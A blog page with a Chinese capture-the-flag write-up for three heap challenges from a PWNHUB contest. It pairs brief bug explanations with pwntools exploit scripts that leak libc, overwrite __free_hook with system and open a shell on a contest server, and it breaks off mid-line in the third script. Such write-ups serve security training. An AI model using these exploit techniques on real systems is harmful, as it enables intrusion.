@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    <meta name="description" content="Hexo Theme Redefine">
+    <meta name="author" content="hash_hash">
+    
+    <title>
+        
+            PWNHUB 3月赛 |
+        
+        hash_hash&#39;s blog
+    </title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://evan.beee.top" crossorigin>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/brands.min.css">
+
+    
+<link rel="stylesheet" href="/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/css/regular.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/css2.css">
+
+    <script id="hexo-configurations">
+    let REDEFINE = window.REDEFINE || {};
+    REDEFINE.hexo_config = {"hostname":"hash-hash.github.io","root":"/","language":"en"};
+    REDEFINE.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#005080","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"center","right_side_width":"210px","content_max_width":"1000px","nav_color":{"left":"#f78736","right":"#367df7","transparency":35},"hover":{"shadow":true,"scale":false},"first_screen":{"enable":false,"background_image":{"light":"https://evan.beee.top/img/wallhaven-wqery6-light.webp","dark":"https://evan.beee.top/img/wallhaven-wqery6-dark.webp"},"title_color":{"light":"#fff","dark":"#d1d1b6"},"description":"Hash_Hash's blog"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":true},"code_block":{"copy":true,"style":"mac"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"0.4.4"};
+    REDEFINE.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+    
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                hash_hash&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <!-- Menu -->
+                            <a class="" 
+                                href="/" >
+                                
+                                    
+                                        <i class="fa-regular fa-house"></i>
+                                    
+                                    HOME
+                                
+                            </a>
+                            <!-- Submenu -->
+                            
+                        </li>
+                    
+                        <li class="menu-item">
+                            <!-- Menu -->
+                            <a class="" 
+                                href="/archives" >
+                                
+                                    
+                                        <i class="fa-regular fa-archive"></i>
+                                    
+                                    ARCHIVES
+                                
+                            </a>
+                            <!-- Submenu -->
+                            
+                        </li>
+                    
+                        <li class="menu-item">
+                            <!-- Menu -->
+                            <a class="" 
+                                href="/categories" >
+                                
+                                    
+                                        <i class="fa-regular fa-bookmark"></i>
+                                    
+                                    CATEGORIES
+                                
+                            </a>
+                            <!-- Submenu -->
+                            
+                        </li>
+                    
+                        <li class="menu-item">
+                            <!-- Menu -->
+                            <a class="" 
+                                href="/about" >
+                                
+                                    
+                                        <i class="fa-regular fa-user"></i>
+                                    
+                                    ABOUT
+                                
+                            </a>
+                            <!-- Submenu -->
+                            
+                        </li>
+                    
+                        <li class="menu-item">
+                            <!-- Menu -->
+                            <a class="" 
+                                href="/links" >
+                                
+                                    
+                                        <i class="fa-regular fa-link"></i>
+                                    
+                                    FRIENDS
+                                
+                            </a>
+                            <!-- Submenu -->
+                            
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" 
+                       href="/" >
+                         
+                            
+                                <i class="fa-regular fa-house"></i>
+                            
+                            HOME
+                        
+                    </a>
+                </li>
+                <!-- Submenu -->
+                
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" 
+                       href="/archives" >
+                         
+                            
+                                <i class="fa-regular fa-archive"></i>
+                            
+                            ARCHIVES
+                        
+                    </a>
+                </li>
+                <!-- Submenu -->
+                
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" 
+                       href="/categories" >
+                         
+                            
+                                <i class="fa-regular fa-bookmark"></i>
+                            
+                            CATEGORIES
+                        
+                    </a>
+                </li>
+                <!-- Submenu -->
+                
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" 
+                       href="/about" >
+                         
+                            
+                                <i class="fa-regular fa-user"></i>
+                            
+                            ABOUT
+                        
+                    </a>
+                </li>
+                <!-- Submenu -->
+                
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" 
+                       href="/links" >
+                         
+                            
+                                <i class="fa-regular fa-link"></i>
+                            
+                            FRIENDS
+                        
+                    </a>
+                </li>
+                <!-- Submenu -->
+                
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+            <div class="article-title">
+                <span class="title-hover-animation"><h1 style="font-size:2rem; font-weight: bold; margin: 10px 0;">PWNHUB 3月赛</h1></span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">hash_hash</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="pc">2023-03-14 13:27:06</span>
+        <span class="mobile">2023-03-14 13:27</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Writeup/">Writeup</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/wp/">wp</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <p>周末hxp给人打懵了，都是些没见过的玩意，曲线同源那块真该补补了，，，</p>
+<p>第二天基本就是各种摸鱼，晚上又看了看论文还是找不到洞，爬了，最近比赛真是刷新认知</p>
+<p>空闲的时候做了做pwnhub，难度比较友好了，都是些不太难的堆题</p>
+<h2 id="sh-v1-1"><a href="#sh-v1-1" class="headerlink" title="sh_v1_1"></a>sh_v1_1</h2><p>题目没给libc，拿到偏移后拿其他题目的libc猜了一手，发现是一样的</p>
+<p>实现的是一个简单的shell，有以下命令</p>
+<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span></span><br><span class="line"><span class="built_in">touch</span></span><br><span class="line"><span class="built_in">cp</span></span><br><span class="line">gedit</span><br><span class="line"><span class="built_in">rm</span></span><br><span class="line"><span class="built_in">ln</span></span><br></pre></td></tr></table></figure></div>
+<p>touch能够创建一个文件，gedit编辑，rm删除</p>
+<p>ln为文件构建链接，这里可以稍微逆一下代码，虽然大部分代码都不用看基本能猜</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit_area[<span class="number">6</span> * mm] = edit_area[<span class="number">6</span> * kk];</span><br></pre></td></tr></table></figure></div>
+<p>注意到这个点基本就行了，白给的uaf，之后就泄露libc打free_hook</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;121.40.89.206&#x27;</span>, <span class="number">34883</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./sh_v1.1&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./2.31-0ubuntu9_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> data :p.send(data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data :p.sendlineafter(delim,data)</span><br><span class="line">ru = <span class="keyword">lambda</span> delims,drop=<span class="literal">True</span> :p.recvuntil(delims,drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat</span>(<span class="params">filename</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;cat &quot;</span>+filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touch</span>(<span class="params">filename, cont</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;touch &quot;</span>+filename)</span><br><span class="line">    sl(cont)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ln</span>(<span class="params">filename, othername</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;ln &quot;</span>+filename+<span class="string">&quot; &quot;</span>+othername)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gedit</span>(<span class="params">filename, cont</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;gedit &quot;</span>+filename)</span><br><span class="line">    sl(cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rm</span>(<span class="params">filename</span>):</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&gt;&gt;&quot;</span>, <span class="string">&quot;rm &quot;</span>+filename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    touch(<span class="built_in">str</span>(i), <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">ln(<span class="string">&quot;6&quot;</span>, <span class="string">&quot;hash2&quot;</span>)</span><br><span class="line">ln(<span class="string">&quot;7&quot;</span>, <span class="string">&quot;hash&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    rm(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">cat(<span class="string">&quot;hash&quot;</span>)</span><br><span class="line">libcbase = uu64(ru(<span class="string">&quot;\n&quot;</span>))-<span class="number">0x1ebbe0</span></span><br><span class="line">lg(<span class="string">&quot;libcbase&quot;</span>, libcbase)</span><br><span class="line">system = libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">gedit(<span class="string">&quot;hash2&quot;</span>, p64(free_hook))</span><br><span class="line">touch(<span class="string">&quot;1&quot;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">touch(<span class="string">&quot;2&quot;</span>, p64(system))</span><br><span class="line">rm(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+<h2 id="ttsc"><a href="#ttsc" class="headerlink" title="ttsc"></a>ttsc</h2><p>off by one打堆重叠，利用开始泄露的栈地址和栈上残留的io指针，把堆申请到stdout上去，泄露libc，再打free_hook</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;121.40.89.206&#x27;</span>,<span class="number">20111</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./ttsc&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> data :p.send(data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data :p.sendlineafter(delim,data)</span><br><span class="line">ru = <span class="keyword">lambda</span> delims,drop=<span class="literal">True</span> :p.recvuntil(delims,drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i</span>):</span><br><span class="line">    sla(<span class="string">&quot;chs:&quot;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, cont</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;index?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sl(cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;index?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, cont</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;index?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;content:&quot;</span>, cont)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sea(<span class="string">&quot;what is your name?&quot;</span>, <span class="string">b&#x27;hash&#x27;</span>*<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sla(<span class="string">&quot;age?\n&quot;</span>, <span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;high?\n&quot;</span>, <span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">ru(<span class="string">&quot;name: hashhashhashhash&quot;</span>)</span><br><span class="line">stack = uu64(ru(<span class="string">&quot;a&quot;</span>))-<span class="number">0x94d0</span>+<span class="number">0x6c88</span></span><br><span class="line">lg(<span class="string">&quot;stack&quot;</span>, stack)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,  <span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#add(3, 0x8, &#x27;a&#x27;)</span></span><br><span class="line"><span class="comment">#dele(0)</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x71&#x27;</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x41</span>)+p64(stack))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x28</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line">ru(<span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">libcbase = uu64(ru(<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3eb780</span></span><br><span class="line">lg(<span class="string">&quot;libcbase&quot;</span>, libcbase)</span><br><span class="line"></span><br><span class="line">free_hook = libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0x41</span>)+p64(free_hook))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x30</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>, p64(system))</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+<h2 id="three-edit"><a href="#three-edit" class="headerlink" title="three_edit"></a>three_edit</h2><p>edit边界检查不严格，可以劫持到tcache_struct，后面是利用unsorted bin打stdout的常见操作，总共需要爆破两次，一次是堆地址的一个字节，一次是stdout地址的一个字节</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;&#x27;, )</span></span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> data :p.send(data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data :p.sendlineafter(delim,data)</span><br><span class="line">ru = <span class="keyword">lambda</span> delims,drop=<span class="literal">True</span> :p.recvuntil(delims,drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i</span>):</span><br><span class="line">    sla(<span class="string">&quot;is:&quot;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, cont</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;content:&quot;</span>, cont)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;index?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, cont</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;index?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;new content:&quot;</span>, cont)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#p = process(&quot;./pwn4&quot;)</span></span><br><span class="line">        p = remote(<span class="string">&quot;121.40.89.206&quot;</span>, <span class="number">21795</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            add(i, <span class="number">0x70</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            dele(i)</span><br><span class="line"></span><br><span class="line">        dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        edit(-<span class="number">60</span>, <span class="string">b&#x27;\xa0\x12&#x27;</span>)</span><br><span class="line">        add(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">        add(<span class="number">1</span>, <span class="number">0x70</span>, <span class="string">b&#x27;&#x27;</span>)<span class="comment">#heap_array</span></span><br><span class="line"></span><br><span class="line">        edit(<span class="number">1</span>, <span class="string">b&#x27;\xc0\x10&#x27;</span>)</span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">b&#x27;\x90\x14&#x27;</span>)</span><br><span class="line">        add(<span class="number">3</span>, <span class="number">0x70</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line"></span><br><span class="line">        edit(<span class="number">1</span>, <span class="string">b&#x27;\x28\x10&#x27;</span>)</span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">4</span>+<span 